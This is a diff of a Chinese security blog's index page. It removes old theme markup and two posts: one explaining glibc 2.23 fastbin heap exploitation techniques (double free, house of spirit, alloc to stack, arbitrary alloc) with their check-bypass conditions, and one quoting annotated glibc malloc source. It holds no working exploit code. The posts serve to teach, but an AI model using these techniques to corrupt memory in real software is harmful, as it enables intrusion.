@@ -1,780 +1,695 @@
+
+
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
 <head>
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="个人博客，分享网络安全特别是pwn">
+  <meta name="author" content="Saku376">
+  <meta name="keywords" content="网络安全、二进制、pwn">
   
   <title>Saku376&#39;s Pwn Sea</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="个人博客，分享网络安全特别是pwn">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Saku376&#39;s Pwn Sea">
-<meta property="og:url" content="http://example.com/page/3/index.html">
-<meta property="og:site_name" content="Saku376&#39;s Pwn Sea">
-<meta property="og:description" content="个人博客，分享网络安全特别是pwn">
-<meta property="og:locale" content="zh_CN">
-<meta property="article:author" content="Saku376">
-<meta property="article:tag" content="网络安全、二进制、pwn">
-<meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="Saku376's Pwn Sea" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
-    
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
 
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
-  
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
 
-  
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
 <meta name="generator" content="Hexo 5.4.0"></head>
 
+
 <body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Saku376&#39;s Pwn Sea</a>
-      </h1>
-      
-        <h2 id="subtitle-wrap">
-          <a href="/" id="subtitle">技术是海，深不见底；生活是洋，广不着边；而我如浪花，清澈透明并且舞动双手，仰望天空。</a>
-        </h2>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
+  <header style="height: 100vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-          <a class="main-nav-link" href="/">Home</a>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
         
-          <a class="main-nav-link" href="/archives">Archives</a>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
         
-      </nav>
-      <nav id="sub-nav">
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
         
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
         
-        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-堆溢出利用之fastbin" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/" class="article-date">
-  <time class="dt-published" datetime="2021-06-16T21:54:30.000Z" itemprop="datePublished">2021-06-17</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
         
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/">堆溢出利用之Fastbin</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="前半部分-：基于libc2-23（无tcache）"><a href="#前半部分-：基于libc2-23（无tcache）" class="headerlink" title="前半部分 ：基于libc2.23（无tcache）"></a>前半部分 ：基于libc2.23（无tcache）</h1><h3 id="堆机制-fastbin等"><a href="#堆机制-fastbin等" class="headerlink" title="堆机制(fastbin等)"></a>堆机制(fastbin等)</h3><p>想要了解堆机制利用方法必须要先了解堆的基本机制以及结构</p>
-<p>目前主要使用的内存管理库是ptmalloc，而在ptmalloc中，用户请求的空间由名为chunk的数据结构表示</p>
-<p>下面就是一个标准的chunk结构<br><img src="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/1.jpg" alt="1.jpg"><br>该chunk中，prev_size参数为前一chunk的大小，size参数为该chunk的大小，而p参数（pre_insue）为标志位，标志前一个chunk的使用情况。而上述的三个参数组成了chunk的header部分，该部分一般不用被用户直接访问</p>
-<p>用户能够访问的空间为mem部分，如果一个chunk正被使用，则data部分为用户存储的内存空间，此时fd、bk指针并无实际意义。如果一个chunk未被使用，则mem部分的fd与bk存储的分别是上一个和下一个未被使用的chunk的地址。而这样一个由未被使用的chunk组成的链表被称为bin。</p>
-<p>一般而言，不同大小的free chunk会被分类到不同的bin中，而bin的类型可以被分为fast bin，small bin，large Bin和unsorted bin。其中，fast bin的操作效率较高，为单向链表，其它的都是双向链表。较高的操作效率意味着较低的安全性，所以fastbin机制产生的漏洞也是堆区漏洞的最重要组成部分之一。</p>
-<p>诸多的bin链由指针进行管理与保存，数组里头装的就是不同大小的Bin链的头尾结点指针。</p>
-<p>fastbinY数组：大小为10，为fastbin的专用数组<br>bins数组：大小为129，其中unsorted bin占1，small bin占2<del>63，large bin占64</del>126</p>
-<p>bin数组的结构大致如图<br><img src="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/1.png" alt="1.png"><br>而我们的fastbinY数组为了追求效率，直接舍弃了对bk指针的管理，是fastbin形成了一个单链表结构（而非一般的双链表），在进行添加删除操作时使用的 是LIFO原则，结构大致如图。<br><img src="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/2.png" alt="2.png"><br>而fastbin的高效体现在什么地方呢？</p>
-<p>默认情况下，对于size_t为4B的平台，小于64B的chunk分配请求；对于size_t为8B的平台，小于64B的chunk分配请求；对于size_t为8B的平台，小于128B的chunk分配请求，程序会根据所需的size首先到fastbin中去寻找对应大小的bin中是否包含未被使用的chunk，如果有，则直接从bin中返回chunk。而释放chunk时，也根据chunk的size参数计算fastbin中对应的index，如果存在对应的大小，就将chunk直接插入对应的bin中。</p>
-<p>32位平台size_t长度为4字节，64位平台的size_t长度可能是4字节，也可能是8字节，64位linux平台size_t长度为8字节</p>
-<p>而且为了追求效率,fastbin不仅使用单链表进行维护，由fastbin管理的chunk即使在被释放后chunk的p参数也不会被重置，而且在释放时只会对链表指针头部的chunk进行校验。</p>
-<p>以下图为例，在释放掉chunk1之后，结构如图：<br><img src="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/3.png" alt="3.png"><br>此时如果用户想再释放一次chunk1，程序会对单链表的头部chunk进行验证，发现用户对同一个chunk连续进行了两次释放操作，此时程序会报错并停止运行。</p>
-<p>但是如果我们在释放chunk1之后释放一个chunk2，此时fastbin结构如图：<br><img src="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/4.png" alt="4.png"><br>此时头结点就变成了chunk2，此时头结点就变成了chunk2，此时我们就可以对chunk1再一次进行释放操作，这就是fastbin攻击四类型的一种——double free攻击</p>
-<h3 id="fastbin的攻击方式"><a href="#fastbin的攻击方式" class="headerlink" title="fastbin的攻击方式"></a>fastbin的攻击方式</h3><h5 id="1、double-free"><a href="#1、double-free" class="headerlink" title="1、double free"></a>1、double free</h5><p>当我们申请了两块chunk，分别命名为chunk1和chunk2，然后一次释放chunk1和chunk2，此时fastbin结构如图<br><img src="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/5.png" alt="5.png"><br>此时我们利用fastbin的特性，再次释放chunk1，此时会将fastbinY数组的fd指针指向chunk1，把chunk1的fd指针指向chunk2，导致最先进入fastbin的chunk1本应指向0x00的fd指针指向chunk2，此时chunk块结构如图：<br><img src="/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/6.png" alt="6.png"><br>此时我们如果再次申请一块大小与chunk1大小相同的堆块，我们就能从fastbin中取出chunk1，并对chunk1的fd指针进行修改。注意此时当chunk1的fd被修改后，整个单链表的表尾就指向了修改后的fd，此时先连续malloc两次，把chunk2与chunk1一次取出，在下一次malloc的时候，我们就可以在我们指定的地址申请堆块，间接实现了任意地址写操作。（前提：需要操作目标地址使得size通过fastbin的校验）</p>
-<h5 id="2、house-of-spirit"><a href="#2、house-of-spirit" class="headerlink" title="2、house of spirit"></a>2、house of spirit</h5><p>其实感觉house of spirit和double free方法大差不差，只不过更仔细地说明了fake chunk的格式要求，并且修改的不适指定地址的内容，而是指定位置的前后内容。</p>
-<p>要想构造fastbin fake chunk，并且将其释放时，可以将其放入到对应的fastbin链表中，需要绕过一些必要的检测，即</p>
-<p>①fake chunk的ISMMAP位不能为1，因为free时，如果是mmap的chunk，会单独处理<br>②fake chunk地址需要对齐，malloc_align_mask<br>③fake chunk的size大小需要满足对应的fastbin的需求，同时也得对齐。<br>④fake chunk的next chunk大小不能小于2*SIZE_SZ，同时也不能大于av-&gt;system_mem。<br>⑤fake chunk对应的fastbin链表头部不能是该fake chunk，即不能构成double free的情况。</p>
-<p>可以看出，想要使用该技术分配到指定的地址，其实并不需要修改指定指定地址的任何内容，关键是要能够修改指定地址前后的内容使其绕过对应的检测。</p>
-<h5 id="3、alloc-to-stack"><a href="#3、alloc-to-stack" class="headerlink" title="3、alloc to stack"></a>3、alloc to stack</h5><p>原理与前二者基本相同，还是戒尺fastbin链表中的chunk的fd指针（除了double free，还可以用堆溢出等技巧），从而把chunk分配到栈上，从而控制栈上的关键数据（如校验值或者关键的返回地址），当然同时需要栈上存在有满足条件的size值。</p>
-<h5 id="4、arbitrary-alloc"><a href="#4、arbitrary-alloc" class="headerlink" title="4、arbitrary alloc"></a>4、arbitrary alloc</h5><p>arbitrary alloc其实alloc to stack是完全相同的，唯一的区别是分配的目标不再是栈中。事实上只要满足目标地址存在合法的size域（这个size域是构造的，还是自然存在的都无妨），我们可以把chunk分配到任意的可写内存中，比如bss、heap、data、stack等等。</p>
-<p>写到这里，这个fastbin机制的漏洞利用方式已经基本上讲完了（当然是基于libc2.23的）。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/06/16/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin/" data-id="ckq116ki700003ou62mn29pum" data-title="堆溢出利用之Fastbin" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-bin" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/06/14/bin/" class="article-date">
-  <time class="dt-published" datetime="2021-06-14T15:43:00.000Z" itemprop="datePublished">2021-06-14</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
         
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/06/14/bin/">Bin</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h3 id="Fastbin"><a href="#Fastbin" class="headerlink" title="Fastbin"></a>Fastbin</h3><p>大多数程序经常会申请以及释放比较小的内存块。如果将一些较小的chunk释放之后发现存<br>在与之相邻的空闲chunk并将它们进行合并，那么当下一次再次申请相应大小的chunk时，<br>就需要对chunk进行分割，这样就大大降低了堆的利用效率。因为我们把大部分时间花在了<br>合并、分割以及中间检查的过程中。因此,ptmalloc中专门设计了fastbin，对应的变量就是<br>malloc state中的fastbinY</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">   Fastbins</span><br><span class="line"></span><br><span class="line">    An array of lists holding recently freed small chunks.  Fastbins</span><br><span class="line">    are not doubly linked.  It is faster to single-link them, and</span><br><span class="line">    since chunks are never removed from the middles of these lists,</span><br><span class="line">    double linking is not necessary. Also, unlike regular bins, they</span><br><span class="line">    are not even processed <span class="keyword">in</span> FIFO order (they use faster LIFO) since</span><br><span class="line">    ordering doesn<span class="string">&#x27;t much matter in the transient contexts in which</span></span><br><span class="line"><span class="string">    fastbins are normally used.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Chunks in fastbins keep their inuse bit set, so they cannot</span></span><br><span class="line"><span class="string">    be consolidated with other free chunks. malloc_consolidate</span></span><br><span class="line"><span class="string">    releases all chunks in fastbins and consolidates them with</span></span><br><span class="line"><span class="string">    other free chunks.</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">typedef struct malloc_chunk *mfastbinptr;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string">    This is in malloc_state.</span></span><br><span class="line"><span class="string">    /* Fastbins */</span></span><br><span class="line"><span class="string">    mfastbinptr fastbinsY[ NFASTBINS ];</span></span><br><span class="line"><span class="string">*/</span></span><br></pre></td></tr></table></figure>
-<p>为了更加高效地利用fastbin，glibc采用单向链表对其中的每一个Bin进行组织，并且每个<br>bin采取LIFO，最近释放的chunk会更早地被分配，所以会增加适用于局部性。也就是说，<br>当用户需要的chunk的大小小于fastbin的最大大小时，ptmalloc会首先判断fastbin中相应<br>的bin中是否有对应大小的空闲块，如果有的话，就去直接从这个bin中获取chunk。如果<br>没有的话，Ptmalloc才会做接下来的一系列操作。</p>
-<p>默认情况下（32位系统为例），fastbin中默认支持最大的chunk的数据空间大小为64字节。<br>但是其可以支持的chunk的数据空间最大为80字节。除此之外，fastbin最多可以支持的Bin<br>的个数为10个，从数据空间为8个字节开始一直到80字节（主义这里说的是数据空间大小，<br>也即除去prev_size和size字段部分的大小）定义如下</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFASTBINS (fastbin_index(request2size(MAX_FAST_SIZE)) + 1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> DEFAULT_MXFAST</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFAULT_MXFAST (64 * SIZE_SZ / 4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The maximum fastbin request size we support */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_FAST_SIZE (80 * SIZE_SZ / 4)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Since the lowest 2 bits in max_fast don&#x27;t matter in size comparisons,</span></span><br><span class="line"><span class="comment">   they are used as flags.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   FASTCHUNKS_BIT held in max_fast indicates that there are probably</span></span><br><span class="line"><span class="comment">   some fastbin chunks. It is set true on entering a chunk into any</span></span><br><span class="line"><span class="comment">   fastbin, and cleared only in malloc_consolidate.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The truth value is inverted so that have_fastchunks will be true</span></span><br><span class="line"><span class="comment">   upon startup (since statics are zero-filled), simplifying</span></span><br><span class="line"><span class="comment">   initialization checks.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//判断分配区是否有 fast bin chunk，1表示没有</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTCHUNKS_BIT (1U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> have_fastchunks(M) (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> clear_fastchunks(M) catomic_or(&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_fastchunks(M) catomic_and(&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous</span></span><br><span class="line"><span class="comment">   regions.  Otherwise, contiguity is exploited in merging together,</span></span><br><span class="line"><span class="comment">   when possible, results from consecutive MORECORE calls.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The initial value comes from MORECORE_CONTIGUOUS, but is</span></span><br><span class="line"><span class="comment">   changed dynamically if mmap is ever used as an sbrk substitute.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// MORECORE是否返回连续的内存区域。</span></span><br><span class="line"><span class="comment">// 主分配区中的MORECORE其实为sbr()，默认返回连续虚拟地址空间</span></span><br><span class="line"><span class="comment">// 非主分配区使用mmap()分配大块虚拟内存，然后进行切分来模拟主分配区的行为</span></span><br><span class="line"><span class="comment">// 而默认情况下mmap映射区域是不保证虚拟地址空间连续的，所以非主分配区默认分配非连续虚拟地址空间。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NONCONTIGUOUS_BIT (2U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> contiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> noncontiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) != 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_noncontiguous(M) ((M)-&gt;flags |= NONCONTIGUOUS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_contiguous(M) ((M)-&gt;flags &amp;= ~NONCONTIGUOUS_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the</span></span><br><span class="line"><span class="comment">   arena.  Such an arena is no longer used to allocate chunks.  Chunks</span></span><br><span class="line"><span class="comment">   allocated in that arena before detecting corruption are not freed.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARENA_CORRUPTION_BIT (4U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_is_corrupt(A) (((A)-&gt;flags &amp; ARENA_CORRUPTION_BIT))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_arena_corrupt(A) ((A)-&gt;flags |= ARENA_CORRUPTION_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Set value of max_fast.</span></span><br><span class="line"><span class="comment">   Use impossibly small value if 0.</span></span><br><span class="line"><span class="comment">   Precondition: there are no existing fastbin chunks.</span></span><br><span class="line"><span class="comment">   Setting the value clears fastchunk bit but preserves noncontiguous bit.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_max_fast(s)                                                        \</span></span><br><span class="line">    global_max_fast =                                                          \</span><br><span class="line">        (((s) == <span class="number">0</span>) ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> get_max_fast() global_max_fast</span></span><br></pre></td></tr></table></figure>
-<p>ptmalloc默认情况下会调用set_max_fast(s)将全局变量global_max_fast设置为DEFAULT_<br>MXFAST,也就是设置fast bins 中chunk的最大值。当MAX_FAST_SIZE被设置为0时，系统<br>就不会支持fastbin。</p>
-<p><strong>fastbin的索引</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[ idx ])</span></span><br><span class="line"></span><br><span class="line">/* offset 2 to use otherwise unindexable first 2 bins */</span><br><span class="line">// chunk size=2*size_sz*(2+idx)</span><br><span class="line">// 这里要减2，否则的话，前两个bin没有办法索引到。</span><br><span class="line"><span class="comment">#define fastbin_index(sz)                                                      \</span></span><br><span class="line">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></pre></td></tr></table></figure>
-<p>需要特别注意的是，fastbin范围的chunk的inuse始终被置为1。因此它们不会和其它被释放<br>的chunk合并。<br>但是当释放的chunk与该chunk相邻的空闲chunk合并后的大小大于FASTBIN_CONSOLIDATION_<br>THRESHOLD时，内存碎片可能比较多了，我们就需要把fastbins中的chunk都进行合并，<br>以减少内存碎片对系统的影响。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">   FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk <span class="keyword">in</span> free()</span><br><span class="line">   that triggers automatic consolidation of possibly-surrounding</span><br><span class="line">   fastbin chunks. This is a heuristic, so the exact value should not</span><br><span class="line">   matter too much. It is defined at half the default trim threshold as a</span><br><span class="line">   compromise heuristic to only attempt consolidation <span class="keyword">if</span> it is likely</span><br><span class="line">   to lead to trimming. However, it is not dynamically tunable, since</span><br><span class="line">   consolidation reduces fragmentation surrounding large chunks even</span><br><span class="line">   <span class="keyword">if</span> trimming is not used.</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"><span class="comment">#define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL)</span></span><br></pre></td></tr></table></figure>
-<p>malloc_consolidate函数可以将fastbin中所有能和其它合并的chunk合并在一起。<br>具体地参见后续的详细函数的分析。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Chunks in fastbins keep their inuse bit set, so they cannot</span></span><br><span class="line"><span class="comment">    be consolidated with other free chunks. malloc_consolidate</span></span><br><span class="line"><span class="comment">    releases all chunks in fastbins and consolidates them with</span></span><br><span class="line"><span class="comment">    other free chunks.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><strong>small bin</strong><br>small bins中每个chunk的大小与其所在的bin的index的关系为：chunk_size=2*SIZE_SZ<br>*index，具体如下</p>
-<hr>
-<p>下标          SIZE_SZ=4(32位)          SIZE_SZ=8(64位)<br>2                     16                                  32<br>3                     24                                  48<br>4                     32                                  64<br>5                     40                                  80<br>x                     2<em>4</em>x                              2<em>8</em>x<br>63                   504                                1008</p>
-<hr>
-<p>small bins中一共有62个循环双向链表，每个链表中存储的chunk大小都一致。比如对于32<br>位系统来说，下标2对应的双向链表中存储的chunk大小均为16个字节。每个链表都有链表头<br>结点，这样可以方便对于链表内部结点的管理。此外，small bins中每个Bin对应的链表采用<br>FIFO的规则，所以同一个链表中先被释放的chunk会先被分配出去。</p>
-<p>small bin相关的宏如下</p>
